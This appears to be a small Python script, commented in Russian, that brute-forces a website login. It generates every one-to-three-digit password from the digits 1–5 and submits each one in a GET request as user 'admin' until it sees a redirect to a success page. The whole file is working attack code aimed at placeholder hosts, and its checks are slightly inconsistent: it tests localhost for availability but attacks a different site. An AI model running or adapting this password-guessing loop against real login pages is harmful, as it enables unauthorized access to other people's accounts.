import urllib.request
import time
import requests
import urllib.parse
import itertools
r=0
checker=0;
count=0
user_login="admin"   #задаем логин,пароль которого будем перебирать
pass_long=3         #задаем длину пароля,который будем перебирать
file_path="password.txt"
try:                #проверка ошибок
        f=open('password.txt','w')
        while(pass_long!=0):  #генератор возможных паролей из указанного набора символов
            for i in itertools.product('12345',repeat=pass_long):
                f.write(''.join(i))
                f.write('\n')
                count+=1
            pass_long-=1
except Exception:
    print("File is not exist")
    exit()

t1 = time.time()#засекаем время начала перебора
try:
    f=open('password.txt')
    print("Процесс перебора запущен...")
    
    for password in f:#перебираем каждый сгенерированный пароль
        password=password[0:-1]
        data=[("login",user_login),("password",password),("submit","submit")]
        enc_data=urllib.parse.urlencode(data)#кодируем запрос в вид URL
        try:
                   
            r = requests.get("http://localhost/login.php")#проверка доступности сайта
            r=r.status_code
        except Exception:
                print("Ошибка соединения. Попробуйте еще раз")
                exit()
        if r!=200:#проверка доступности сайта
            print("Сайт недоступен")
            exit()
        else:
            get_request=urllib.request.urlopen("http://mysite.ru/login.php"+"?" +enc_data) #делаем get-запрос на сайт с заполненными формами логин/пароль
            x=get_request.geturl()
            if (x=="http://mysite.ru/success.php"):#если произошел редирект, то пароль подобран правильно
                print("Password is: ",password)
                checker=1 #флаг того,что пароль подобран верноы
                break
    if(checker==1):
            
            print("Перебор занял",time.time() - t1,"секунд")
            print("Кол-во возможных паролей",count)
    else:
            print("Перебор занял",time.time() - t1,"секунд")
            print("Кол-во возможных паролей",count)
            print("Пароль не найден")
    f.close()

except Exception:
    print("Файл не существует")

